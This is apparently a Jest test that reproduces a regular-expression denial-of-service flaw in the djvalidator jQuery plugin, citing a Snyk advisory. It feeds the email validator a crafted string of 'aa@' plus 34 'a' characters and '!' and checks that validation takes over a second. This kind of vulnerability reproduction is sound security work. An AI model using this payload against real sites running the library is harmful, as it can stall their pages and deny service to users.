//https://snyk.io/vuln/SNYK-JS-DJVALIDATOR-1018709
test("ReDos in djvalidator", () => {
  const measureTime = require("./utils").measureTime;

  window.eval(
    `document.body.innerHTML = '<input type="email" id="input" data-dj-validator="email,*" value="aa@${"a".repeat(
      34
    )}!">';`
  );

  $ = jQuery = require("jquery");

  require("djvalidator");

  let t = measureTime(function () {
    jQuery("#input").djValidator();
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
